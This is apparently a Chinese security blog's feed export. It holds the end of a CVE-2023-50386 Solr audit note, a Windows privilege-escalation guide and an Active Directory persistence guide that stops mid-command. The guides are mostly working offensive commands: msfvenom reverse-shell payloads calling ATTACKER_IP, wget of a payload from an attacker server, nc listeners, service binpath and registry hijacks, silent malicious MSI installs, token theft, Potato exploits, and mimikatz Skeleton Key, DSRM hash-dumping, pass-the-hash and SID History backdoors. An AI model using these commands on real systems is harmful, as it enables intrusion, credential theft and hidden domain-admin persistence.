alt="img"></p><p>可以看到长长的目录，lib&#x2F;collection1&#x2F;zk_backup_0&#x2F;configs&#x2F;conf1&#x2F;Exp.class</p><p>Q:<br>为什么作者创建的包名是zk_backup_0.configs.conf1</p><p>而不是collection1.zk_backup_0.configs.conf1?</p><p><img src="/../CVE-2023-50386/image-20240225152446924.png" alt="image-20240225152446924"></p><p>A:</p><p>debug一下：<br><img src="/../CVE-2023-50386/92700088DFCD4AD895391D4229E635D0.png" alt="img"><br>如图，他会从lib的一级子目录底下开始找，也就是collection1。还有一种情况就是找lib下的jar包，但是这里实现不了。</p><h1 id="3：命令执行"><a href="#3：命令执行" class="headerlink" title="3：命令执行"></a>3：命令执行</h1><p>我稍微跟了下，以下是截图。</p><p><img src="/../CVE-2023-50386/AD94415DD91E4561A71C6FF7D1F6A43B.png" alt="img"></p><p>命令执行的地方在这：<br>SolrCore#createInstance<br><img src="/../CVE-2023-50386/151EFCE87FEC43F9AF46A10F23EDDE5A.png" alt="img"></p><p>关键方法是这个：<br>SolrCore:<br><img src="/../CVE-2023-50386/9D9547D7893542EABCF74B8DEC447200.png" alt="img"></p><p>对应了原文中的解释：<img src="/../CVE-2023-50386/B11AE96930A44A7EB10BB48E7C6089C8.png" alt="img"></p><h1 id="4：关于沙箱绕过"><a href="#4：关于沙箱绕过" class="headerlink" title="4：关于沙箱绕过"></a>4：关于沙箱绕过</h1><p>参考：<a href="https://www.mi1k7ea.com/2020/05/03/%E6%B5%85%E6%9E%90Java%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://www.mi1k7ea.com/2020/05/03/%E6%B5%85%E6%9E%90Java%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</a></p><p><img src="/../CVE-2023-50386/image-20240225152945186.png" alt="image-20240225152945186"></p><p>这里有policy文件，看下去。</p><p>看看能咋绕：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">grep -E -n &#x27;permission java\<span class="hljs-string">.lang</span>\<span class="hljs-string">.RuntimePermission</span> <span class="hljs-string">&quot;setSecurityManager&quot;</span>|permission java\<span class="hljs-string">.lang</span>\<span class="hljs-string">.reflect</span>\<span class="hljs-string">.ReflectPermission</span> <span class="hljs-string">&quot;suppressAccessChecks&quot;</span>|permission java\<span class="hljs-string">.lang</span>\<span class="hljs-string">.RuntimePermission</span> <span class="hljs-string">&quot;accessDeclaredMembers&quot;</span>|permission java\<span class="hljs-string">.lang</span>\<span class="hljs-string">.RuntimePermission</span> <span class="hljs-string">&quot;createClassLoader&quot;</span>|permission java\<span class="hljs-string">.lang</span>\<span class="hljs-string">.RuntimePermission</span> <span class="hljs-string">&quot;loadLibrary\.*&quot;</span>&#x27; <span class="hljs-string">/opt/solr/server/etc/security.policy</span><br></code></pre></td></tr></table></figure><p><img src="/../CVE-2023-50386/image-20240225153340959.png" alt="image-20240225153340959"></p><p>看起来反射和classLoader都可以绕。</p><p>*反射在JDK17有很大限制，不太行，ClassLoader写的demo执行了，然后调了两小时，没调出来。。。</p>]]></content>
    
    
    
    <tags>
      
      <tag>java codeaudit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/02/24/Jdk7u21/"/>
    <url>/2024/02/24/Jdk7u21/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/02/21/gitea-1-4-rce/"/>
    <url>/2024/02/21/gitea-1-4-rce/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/01/30/%E4%B8%93%E9%A2%98-%E6%94%BB%E5%87%BBKerberos/"/>
    <url>/2024/01/30/%E4%B8%93%E9%A2%98-%E6%94%BB%E5%87%BBKerberos/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/01/30/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"/>
    <url>/2024/01/30/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Windows提权总结</title>
    <link href="/2024/01/30/Windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"/>
    <url>/2024/01/30/Windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="一：不安全的服务权限"><a href="#一：不安全的服务权限" class="headerlink" title="一：不安全的服务权限"></a>一：不安全的服务权限</h1><p>基础知识：<br>应用软件注册服务时会在本地注册一些服务，并且大多数服务在计算机开机的时候以系统SYSTEM启动。<br>服务创建时，会在此创建注册表项。<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services</p><p>对于权限查找，我们可以用微软提供的AccessChk工具。<br>低权限用户可以检查Authenticated Users和INTERACTIVE组队系统服务的权限。<br>前者为经过身份验证的用户，包含系统中所有使用用户名，密码登陆并通过身份验证的账户。</p><p>后者为交互式用户组。包含系统中直接登陆到计算机进行操作的用户。<br>默认情况下这两个组均为Users组成员。</p><h2 id="1-不安全的服务配置权限"><a href="#1-不安全的服务配置权限" class="headerlink" title="1.不安全的服务配置权限"></a>1.不安全的服务配置权限</h2><p>利用微软的工具accessChk.exe查找服务。<br>accesschk.exe &#x2F;accepteula -uwcqv “Authenticated Users” *<br>假如我们对InsproSvc服务拥有SERVICE_CHANGE_CONFIG权限：</p><p>*注意binpath后的空格<br>sc config InsproSbc binpath&#x3D; “cmd.exe &#x2F;k reverse_tcp.exe”</p><p>如果还有SERVICE_STOP和SERVICE_START<br>可以直接<br>sc stop name<br>sc start name</p><h2 id="2-不安全的注册表权限"><a href="#2-不安全的注册表权限" class="headerlink" title="2.不安全的注册表权限"></a>2.不安全的注册表权限</h2><p>*注：这个和上一个不一样，是通过注册表修改ImagePath<br>accesschk.exe &#x2F;accepteula -uvwqk “Authenticated Users” HKLM\SYSTEM\CurrentControlSet\Services</p><p>假如我们对某服务注册表有KEY_ALL_ACCESS权限。<br>reg add HKLM_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RegSvc &#x2F;v ImagePath &#x2F;t REG_EXPAND_SZ &#x2F;d “cmd.exe &#x2F;k reverse_tcp” &#x2F;f</p><p>查看是否有重启权限：<br>accesschk.exe &#x2F;accepteula -ucqv “Authenticated Users” some_services</p><p>*根据目标机软件提权：<br>查看安装在目标机的软件：<br>wmic product get name,version,vendor<br>*需要一分钟的时间。</p><p>wmic product可能不会返回所有安装的项目。<br>除此之外推荐检查桌面的shortcuts。可用的服务等。</p><p>完事后，我们就可以通过exploit-db或者google搜索exp。</p><p>metasploit：<br>在获取了meterpreter shell之后：<br>可以用multi&#x2F;recon&#x2F;local_exploit_suggester 模块枚举。</p><h2 id="3-服务路径权限可控"><a href="#3-服务路径权限可控" class="headerlink" title="3.服务路径权限可控"></a>3.服务路径权限可控</h2><p>accesschk.exe &#x2F;accepteula -quv “C:\目录”<br>假如拥有FILE_ALL_ACCESS权限。<br>然后参考下面的即可</p><p>*自动化工具利用：<br>如果不用access查看，可以用winpeas一把嗦查找服务<br>或者使用powerup<br>这几个更方便。</p><p>查找到：<br>例如，我们有一个WindowsScheduler的服务。<br>sc qc WindowsScheduler:<br><img src="/../WindowsPrivilegeEscalation/24EFBB70AA224B8AB384FBA6035D4EFA.png" alt="img"></p><p>然后看一下WService.exe文件：<br><img src="/../WindowsPrivilegeEscalation/C01F3D4C21C1442080A10C3D521C179F.png" alt="img"><br>可以看到所有都有M权限。我们可以轻易修改这个文件：<br>攻击机生成一个rev-svc.exe<br>msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcpLHOST&#x3D;ATTACKER_IPLPORT&#x3D;4445-f exe-service -o rev-svc.exe</p><p>python -m http.server</p><p>利用powreshell获取：<br>wget <a href="http://attacker_ip:8000/rev-svc.exe">http://attacker_ip:8000/rev-svc.exe</a> -O rev-svc.exe</p><p><img src="/../WindowsPrivilegeEscalation/DE34FAF2CD2A46CFB71268F8AAD9ECE6.png" alt="img"><br>挪到下面，然后授予F权限（F， 完全控制，见最后一行）</p><p>在攻击机监听： nc -lvvp 4445</p><p>sc stop windowsscheduler<br>sc start windowsscheduler<br>重启下服务。</p><p>如果使用powershell，请用Set-Content代替sc，或者sc.exe代替sc</p><p>这样就提升到root权限了。</p><h2 id="4：未引用的服务路径（Unquoted-Services）"><a href="#4：未引用的服务路径（Unquoted-Services）" class="headerlink" title="4：未引用的服务路径（Unquoted Services）"></a>4：未引用的服务路径（Unquoted Services）</h2><p>查找：<br>wmic service get DisplayName, PathName, StartMode |findstr &#x2F;i &#x2F;v “C:\Windows\“ | findstr &#x2F;i &#x2F;v “””</p><p>假如我们找到了：C:\Program Files\Unquoted Path\Sub dir\This_is_a_fucking_unquoted_service.exe</p><p>检查用户是否有权限：(一级一级查看，先查看最上面的)<br>accesschk.exe &#x2F;accepteula &#x2F;quv “Authenticated Users” “C:\Program Files\Unquoted Path&quot;<br>然后 </p><p>例如：<br><img src="/../WindowsPrivilegeEscalation/DDDB8387370A4D13A8CE6D37CED1C7A7.png" alt="img"></p><p>利用msfvenom生成反弹shell并传过去。<br>放在C:\MyPrograms\Disk.exe</p><p>icacls C:\MyPrograms\Disk.exe &#x2F;grant Everyone:F</p><p><img src="/../WindowsPrivilegeEscalation/45CF62647CB64383B79118B464B4370D.png" alt="img"><br>重启服务。</p><p>或者直接shutdown -r -t 0<br>监听端口。拿到shell。</p><p>*上述都在powerup工具中完成了集成。</p><h1 id="二：MSI安装策略提权"><a href="#二：MSI安装策略提权" class="headerlink" title="二：MSI安装策略提权"></a>二：MSI安装策略提权</h1><p>MSI安装策略提权，如果用户配置MSI安装策略，启用了“永远以搞特权进行安装”<br>AlwaysInstallElevated(默认情况下为禁用)<br>使得任何权限的用户都可以通过SYSTEM权限安装MSI（类似于SUID）<br>那么可以制作恶意msi文件进行提权。</p><p>MSI(Microsoft Installer)是微软格式的应用程序安装包。</p><p>确定是否存在漏洞：<br>查看注册表：</p><p>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated</p><p>reg query HKCU\SOFTWARE\Polices\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated</p><p>利用msfvenom生成恶意msi文件：<br>msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;lateralmovement LPORT&#x3D;4445-f msi&gt;myinstaller.msi</p><p>可以利用meterpreter上传</p><p>安装：<br>msiexec &#x2F;quiet &#x2F;qn &#x2F;i myinstall.msi<br>#&#x2F;quiet 安装期间禁止向用户发消息。<br>#&#x2F;qn 无GUI模式允许<br>#&#x2F;i 常规安装。</p><h1 id="三：访问令牌操纵"><a href="#三：访问令牌操纵" class="headerlink" title="三：访问令牌操纵"></a>三：访问令牌操纵</h1><p>Windows访问控制模型：(Access Control Model)<br>由访问令牌（Access Token）, 安全描述符（Security Descriptor）两部分组成。<br>二者分别被访问者和被访问者拥有。通过比较访问令牌和安全描述符。windows可以对访问者是否有权限访问某资源判定。</p><p>通过操纵访问令牌，使正在运行的进程看起来是其他进程的子进程或属于其他用户所启动的进程，这常常使用内置的Windows API<br>从指定的进程中复制访问令牌，并将得到的访问令牌用于现有进程或生成新进程<br>从而达到权限提升并绕过访问控制的目的，称为：令牌窃取</p><p>利用条件：需要特权用户。因为通过令牌创建进程使用的<br>CreateProcessWithTokenW &amp; CreateProcessAsUserA两个Windows API分别要求用户必须拥有：<br>SeImpersonatePrivilate和SeAssignPrimaryTOkenPrivilege&#x2F;SeIncreateQuotaPrivilege特权。</p><p>拥有这两个的一般为：管理员账户，网络服务账户或者系统服务账户（如MSSQL， IIS）</p><p>可以上传incognito.exe进行令牌窃取。<br>第二种就是：meterpreter自带incognito</p><p>load incognito<br>use incognito<br>list_tokens -u<br><img src="/../WindowsPrivilegeEscalation/710CAF95B9B749E8AE7E43F5C65087FF.png" alt="img"></p><p>impersonate_token “xxx”  #窃取xx的令牌<br>steal_token &lt;PID&gt;  #从进程窃取令牌<br>如果要切回自己的权限：rev2self</p><p>通过令牌获取TrustedInstaller权限：<br>通常认为，SYSTEM权限为Windows系统中的最高权限，但是即便获取了SYSTEM也不能修改windows系统文件。如C:\Windows\servicing目录。</p><p>但其实通过icacls查看该目录，NT SERVICE\TrustedInstaller账户对其具有完全控制权限。<br>总Windows Vista开始系统内置了这么一个安全主体，拥有修改系统文件权限，专门用于系统进行维护更新。<br>通常以一个账户组出现：NT SERVICE\TrustedInstaller</p><p>TrustedInstall本质上是个服务，启动该服务会运行TrustedInstaller.exe 该程序在胸上的路径为：<br>“C:\Windows\servicing\TrustedInstaller.exe” 其拥有者为NT SERVICE\TrustedInstaller</p><p>可以通过窃取这个令牌获取TrustedInstaller权限。（Higher than SYSTEM!）</p><p>利用条件：SYSTEM权限。<br><img src="/../WindowsPrivilegeEscalation/97674FFB52774C08B1B78B538D28FCC7.png" alt="img"><br>如图，虽然不会显示TrustedInstaller，但是实际上是有这个权限的</p><p>小总结：<br>windows中权限依次提升顺序为：<br>Nomal Users –&gt; Administrators –&gt; SYSTEM –&gt; TrustedInstaller</p><p>比较快捷的思路：我们可以在管理员的权限创建恶意服务，提升到SYSTEM，最后利用访问令牌窃取到TrustedInstaller最高权限。<br>恶意服务提升至SYSTEM，更多见权限维持篇。权限维持篇是以Administrator为基础展开。</p><ul><li>事实上拿到Administrator，可以直接用meterpreter的getsystem。meterpreter已经集成了这个功能。</li></ul><h1 id="四：Potato家族提权"><a href="#四：Potato家族提权" class="headerlink" title="四：Potato家族提权"></a>四：Potato家族提权</h1><h2 id="Rotten-Potato-MS16-075"><a href="#Rotten-Potato-MS16-075" class="headerlink" title="Rotten Potato(MS16-075)"></a>Rotten Potato(MS16-075)</h2><p>只针对本地用户，不针对域用户。<br>适用版本：win 7 8 10 2008 2012</p><p>原理：<br>1：欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。<br>2：对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。<br>3：模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。</p><p>上传rottenpotato.exe到攻击机。<br>meterpreter执行：execute -Hc -f rottenpotato.exe</p><p>此时执行list_tokens -u 就可以看到SYSTEM的凭证了。<br>之后正常进行令牌窃取就可。</p><h2 id="JuicyPotato-MS-16-075-extend"><a href="#JuicyPotato-MS-16-075-extend" class="headerlink" title="JuicyPotato(MS-16-075 extend)"></a>JuicyPotato(MS-16-075 extend)</h2><p>使用原作者的ps1脚本查一下COM对象<br><img src="/../WindowsPrivilegeEscalation/819550D8434C42259CF1B1C7C9CDABD4.png" alt="img"><br>或者自己手动查。<br>再用这个：<br><img src="/../WindowsPrivilegeEscalation/1D3E261E992F4EF09C2DA685E1F4BAD1.png" alt="img"></p><p>*这个作者还有一个webshell的juicypotato非常好用。</p><p>提权命令：<br>Potato.exe -t t -p C:\Users\Public\Desktop\shell.exe -l 6666 -n 135 -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}</p><p>*-p参数改为反弹shell路径也可。<br>-t 指定要使用CreateProcessWithTokenW &#x2F; CreateProcessAsUserA()<br>哪个函数创建进程。</p><p>-n 指定本地RPC服务端口，默认135。 -c 指定要加载对象的CLSID。</p><p>利用条件：<br>需要支持SeImpersonate或者SeAssignPrimaryToken权限（通常情况下IIS、MSSQL或者其他服务账户具有这两个权限）<br>开启DCOM<br>本地支持RPC或者远程服务器支持PRC并能成功登录<br>能够找到可用的COM对象</p><p>windows版本：<br>windows &lt; windows 10 version 1809<br>windows server &lt; Windows Server 2019</p><p>什么是DCOM：<br>DCOM（Distributed Component Object Model）是一种用于在分布式计算环境中进行组件通信的技术，特别是在Windows操作系统中广泛使用。DCOM是微软的COM（Component Object Model）的分布式版本，它允许在网络上的不同计算机上的组件之间进行通信和交互。<br>以下是关于DCOM在Windows中的一些关键概念：<br>组件（Component）：组件是应用程序的可重用部分，可以包括对象、库和服务。这些组件可以在不同计算机上运行，并且可以通过DCOM进行通信。<br>COM 对象（COM Objects）：COM（Component Object Model）对象是Windows中的可编程对象，具有公开的接口，可以通过这些接口与其他对象进行通信。COM对象是DCOM的基础。<br>分布式：DCOM允许在网络上的不同计算机上运行的COM对象进行通信。这使得分布式应用程序开发变得更加容易，因为您可以将组件部署在不同的计算机上，并通过网络进行通信。<br>接口（Interfaces）：COM对象通过公开接口来定义其功能。其他对象可以通过调用这些接口上的方法来与COM对象进行通信。<br>远程过程调用（RPC）：DCOM使用RPC技术来实现远程对象之间的通信。它允许对象在不同计算机上执行方法调用，就像它们在同一台计算机上一样。<br>注册表（Registry）：DCOM信息通常在Windows注册表中注册，这包括COM对象的 CLSID（Class Identifier）和接口的 IID（Interface Identifier）等信息。这使得系统能够查找和调用正确的组件。<br>安全性：DCOM提供了一些安全机制，如身份验证和授权，以确保只有经过授权的应用程序可以访问远程对象。</p><p>如何查看DCOM是否开启：<br>dcomcnfg.exe &#x2F;Query<br>*windows server 2012是默认开启的。</p><p>原理：<br>其实和Rotten差不多，是在其进行的扩展。比rotten更广泛使用：<br>· LocalService用户默认具有SeImpersonate和SeAssignPrimaryToken权限<br>· 开启SeImpersonate权限后，能够在调用CreateProcessWithToken时，传入新的Token创建新的进程<br>· 开启SeAssignPrimaryToken权限后，能够在调用CreateProcessAsUser时，传入新的Token创建新的进程<br>Juicy Potato的实现流程如下：<br>1、加载COM，发出请求，权限为System<br>在指定ip和端口的位置尝试加载一个COM对象。<br>RottenPotatoNG使用的COM对象为BITS，CLSID为{4991d34b-80a1-4291-83b6-3328366b9097}<br>可供选择的COM对象不唯一，Juicy Potato提供了多个，详细列表可参考如下地址：<br><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a><br>2、回应步骤1的请求，发起NTLM认证<br>正常情况下，由于权限不足，当前权限不是System，无法认证成功。<br>3、针对本地端口，同样发起NTLM认证，权限为当前用户<br>由于权限为当前用户，所以NTLM认证能够成功完成。<br>RottenPotatoNG使用的135端口。<br>Juicy Potato支持指定任意本地端口，但是RPC一般默认为135端口，很少被修改。<br>4、分别拦截两个NTLM认证的数据包，替换数据，通过NTLM重放使得步骤1(权限为System)的NTLM认证通过，获得System权限的Token<br>重放时需要注意NTLM认证的NTLM Server Challenge不同，需要修正。<br>5、利用System权限的Token创建新进程<br>如果开启SeImpersonate权限，调用CreateProcessWithToken，传入System权限的Token，创建的进程为System权限。<br>如果开启SeAssignPrimaryToken权限，调用CreateProcessAsUser，传入System权限的Token，创建的进程为System权限</p><p>*实验小结：<br>其实用了juicy的检查对象ps1脚本，第二个就是DCOM中的BIT对象。</p><h2 id="3-PrintSpoofer-Pipe-Potato"><a href="#3-PrintSpoofer-Pipe-Potato" class="headerlink" title="3 PrintSpoofer(Pipe Potato)"></a>3 PrintSpoofer(Pipe Potato)</h2><p>PrintSpoofer64.exe -i -c cmd</p><p>打印机漏洞<br>漏洞原理：<br>不看了，看不太懂。</p><p>影响版本：<br>* Windows Server 2019 (Server Core installation)<br>* Windows Server 2012 R2 (Server Core installation)<br>* Windows Server 2012 R2<br>* Windows Server 2012 (Server Core installation)<br>* Windows Server 2012<br>* Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)<br>* Windows RT 8.1<br>* Windows 8.1 for x64-based systems<br>* Windows 8.1 for 32-bit systems<br>* Windows 7 for x64-based Systems Service Pack 1<br>* Windows 7 for 32-bit Systems Service Pack 1<br>* Windows 10 Version 1607 for x64-based Systems<br>* Windows 10 Version 1607 for 32-bit Systems</p><h2 id="4：SweetPotato-集成工具"><a href="#4：SweetPotato-集成工具" class="headerlink" title="4：SweetPotato(集成工具)"></a>4：SweetPotato(集成工具)</h2><p>见sweetpotato.exe or github</p><h1 id="其他大漏洞"><a href="#其他大漏洞" class="headerlink" title="其他大漏洞"></a>其他大漏洞</h1><h2 id="1-HiveNightmare-CVE-2021-36934"><a href="#1-HiveNightmare-CVE-2021-36934" class="headerlink" title="1:HiveNightmare(CVE-2021-36934)"></a>1:HiveNightmare(CVE-2021-36934)</h2><p>标准用户未授权读取系统文件，可进行哈希传递攻击或暴力破解攻击。</p><p>影响版本：windows 10 version 1809以前所有版本。</p><p>工具：见github。</p><h2 id="2：Zerologin-CVE-2020-1472"><a href="#2：Zerologin-CVE-2020-1472" class="headerlink" title="2：Zerologin(CVE-2020-1472)"></a>2：Zerologin(CVE-2020-1472)</h2><p>域内提权漏洞，可以重置域控密码。</p><p>工具：直接搜cve-2020-1472-exploit.py</p><p>mimikatz也集成了该模块。</p><h2 id="3：Print-Spooler系列漏洞"><a href="#3：Print-Spooler系列漏洞" class="headerlink" title="3：Print Spooler系列漏洞"></a>3：Print Spooler系列漏洞</h2><p>这个是windows的打印后台处理服务，控制打印工作。该服务默认开启。</p><h3 id="PrintDemon-CVE-2020-1048"><a href="#PrintDemon-CVE-2020-1048" class="headerlink" title="PrintDemon(CVE-2020-1048)"></a>PrintDemon(CVE-2020-1048)</h3><h3 id="PrintNightmare-CVE-2021-1675-CVE-2021-34527"><a href="#PrintNightmare-CVE-2021-1675-CVE-2021-34527" class="headerlink" title="PrintNightmare(CVE-2021-1675 &#x2F; CVE-2021-34527)"></a>PrintNightmare(CVE-2021-1675 &#x2F; CVE-2021-34527)</h3><p>一个是权限提升，另一个是RCE</p><p>这些都在metasploit中集成了。</p><h2 id="4：Nopac域内提取"><a href="#4：Nopac域内提取" class="headerlink" title="4：Nopac域内提取"></a>4：Nopac域内提取</h2><p>和kerberoas协议有关。(CVE-2022-26923)</p>]]></content>
    
    
    
    <tags>
      
      <tag>red team</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/01/30/Apache-Dubbo-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2024/01/30/Apache-Dubbo-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/01/30/Apache-OFbiz-groovy-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/01/30/Apache-OFbiz-groovy-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>权限维持-域后门</title>
    <link href="/2024/01/19/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%9F%9F%E5%90%8E%E9%97%A8/"/>
    <url>/2024/01/19/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%9F%9F%E5%90%8E%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<p>拿到域控后，需要一些技术来保持权限维持，接下来介绍常见的域控技术。</p><h1 id="1：创建Skeleton域后门"><a href="#1：创建Skeleton域后门" class="headerlink" title="1：创建Skeleton域后门"></a>1：创建Skeleton域后门</h1><p>安装Skeleton Key后，所有域账户都可以使用一个相同的密码进行认证，同时原有密码仍然有效。<br>该技术通过注入lsass。exe进程实现，创建的Skeleton Key保存在内存中，如果域控重启，那么其<br>将会失效。</p><p>利用条件：域管理员</p><p>利用工具：mimikatz。</p><p>mimikatz.exe<br>privilege::debug<br>misc::skeleton<br>exit</p><p>这样所有的域账户有一个相同的密码mimikatz。</p><p>缓解措施：<br>微软在 2014 年 3 月添加了 LSA（Local Security Authority，本地安全机构）保护策略，用来防止对 lsass.exe 进程的内存读取和代码注入。通过执行以下命令，可以开启或关闭 LSA 保护。</p><p># 开启 LSA 保护策略<br>reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa” &#x2F;v RunAsPPL &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<br># 关闭 LSA 保护策略<br>reg delete “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa” &#x2F;v RunAsPPL<br>开启LSA 保护策略并重启系统后，Mimikatz 的相关操作都会失败。此时即使已经获取了 Debug 权限也无法读取用户哈希值，更无法安装 Skeleton Key。</p><h1 id="2：创建DSRM域后门"><a href="#2：创建DSRM域后门" class="headerlink" title="2：创建DSRM域后门"></a>2：创建DSRM域后门</h1><p>DSRM（Directory Services Restore Mode，目录服务还原模式）是域控的安全模式启动选项，用于使服务器脱机，以进行紧急维护。在初期安装 Windows 域服务时，安装向导会提示用户设置 DSRM 的管理员密码。有了该密码后，网络管理员可以在后期域控发生问题时修复、还原或重建活动目录数据库。<br>在域控上，DSRM 账户实际上就是本地管理员账户（Administrator），并且该账户的密码在创建后几乎很少使用。通过在域控上运行 NTDSUtil，可以为 DSRM 账户修改密码，相关命令如下：</p><p>*其实就是一个账户。</p><p>利用条件：<br>windows server 2008之后，并且拥有域管。</p><p>通过mimikatz读取域控SAM文件，获取DSRM账户的哈希值<br>mimikatz.exe “privilege::debug” “token::elevate” “lsadump::sam” exit</p><p><img src="/../persistence2/D08C1952C7A5415AB01A25FFD2ACFEB1.png" alt="img"><br>c013ad5754c693dde42e6f2802c8ae4</p><p>改 DSRM 账户的登录模式，以允许该账户远程登录。可以通过编辑注册表的DsrmAdminLogonBehavior 键值来实现，可选用的登录模式有以下3种：<br>0：默认值，只有当域控制器重启并进入 DSRM 模式时，才可以使用 DSRM 管理员账号。<br>1：只有当本地 AD DS 服务停止时，才可以使用 DSRM 管理员账号登录域控制器。<br>2：在任何情况下，都可以使用 DSRM 管理员账号登录域控制器。<br>必然是修改为2：<br>reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa” &#x2F;v DsrmAdminLogonBehavior &#x2F;t REG_DWORD &#x2F;d 2 &#x2F;f</p><p>完事后可以应用到任意的NTLM哈希传递攻击。<br>如mimikatz：<br>sekurlsa::pth &#x2F;user:administrator &#x2F;domain:zhattatey &#x2F;ntlm:c013ad5754c693dde42e6f2802c8ae4d</p><p>或者psexec：<br>.&#x2F;psexec.py zhattatey&#x2F;Administrator@ip -hashes :xxx</p><h1 id="3：SID-History的利用：1-SID-SID-History"><a href="#3：SID-History的利用：1-SID-SID-History" class="headerlink" title="3：SID History的利用：1. SID &amp; SID History"></a>3：SID History的利用：1. SID &amp; SID History</h1><p>在 Windows 系统中，SID（Security Identifiers）是指安全标识符，是用户、用户组或其他安全主体的唯一、不可变标识符。<br>Windows 根据 ACL（访问控制列表）授予或拒绝对资源的访问和特权，ACL 使用 SID 来唯一标识用户及其组成员身份。当用户登录到计算机时，会生成一个访问令牌，其中包含用户和组 SID 和用户权限级别。当用户请求访问资源时，将根据 ACL 检查访问令牌以允许或拒绝对特定对象的特定操作。<br>如果将账户删除，然后使用相同的名字创建另一个账户，那么新账户不会具有前一个账户的特权或访问权限，这是因为两个账户的 SID 不同。<br>SID History 是一个支持域迁移方案的属性，使得一个账户的访问权限可以有效地克隆到另一个账户，这在域迁移过程中非常有用。例如，当 Domain A 中的用户迁移到 Domain B 时，会在 Domain B 中新创建一个账号。此时，将 Domain A 用户的 SID 添加到 Domain B 的用户账户的 SID History 属性中。这就确保了 Domain B 用户仍然拥有访问 Domain A 中资源的权限。</p><p>SID：牌子，ACL：列表。访问时，把列表和牌子对照。</p><p>在实战中，hacker 可以将域管理员用户的 SID 添加到其他域用户的 SID History 属性中，以此建立一个隐蔽的域后门。</p><p>利用条件：域管</p><p>例：将Administrator的SID添加进Alice的SID History<br># mimikatz版本大于2.1.0<br>mimikatz.exe “privilege::debug” “sid::patch” “sid::add &#x2F;sam:Alice &#x2F;new:Administrator” exit<br># mimikatz版本小于2.1.0<br>mimikatz.exe “privilege::debug” “misc::addsid Alice ADSAdministrator” exit</p><p>*通过powershell查看Alice：<br>Import-Module ActiveDirectory<br>Get-ADUser hack -Properties SIDHistory</p><p><img src="/../persistence2/12552693C0FB41C395C8953E6ABE0DBE.png" alt="img"><br>一毛一样。</p><p>如果用Alice连接域控，执行whoami &#x2F;priv将看到拥有域管所有权限。</p><h1 id="4：利用AdminSDHolder打造域后门"><a href="#4：利用AdminSDHolder打造域后门" class="headerlink" title="4：利用AdminSDHolder打造域后门"></a>4：利用AdminSDHolder打造域后门</h1><p>AdminSDHolder 是一个特殊的 Active Directory 容器对象，位于 Domain NC 的 System 容器下。</p><p><img src="/../persistence2/7DE0B2FB79A64F57A0247666F400A286.png" alt="img"><br>AdminSDHolder 通常作为系统中某些受保护对象的安全模板，以防止这些对象遭受恶意修改或滥用。<br>受保护对象通常包括系统的特权用户和重要的组，如 Administrator、Domain Admins、Enterprise Admins 以及 Schema Admins 等。<br>在活动目录中，属性 adminCount 用来标记特权用户和组。对于特权用户和组来说，该属性值被设为 1。<br>通过 ADFind 查询 adminCount 属性设置为 1 的对象，可以找到所有受 AdminSDHolder 保护的特权用户和组。</p><p># 枚举受保护的用户<br>Adfind.exe -b “dc&#x3D;hack-my,dc&#x3D;com” -f “&amp;(objectcategory&#x3D;person)(samaccountname&#x3D;*)(admincount&#x3D;1)” -dn<br># 枚举受保护的组<br>Adfind.exe -b “dc&#x3D;hack-my,dc&#x3D;com” -f 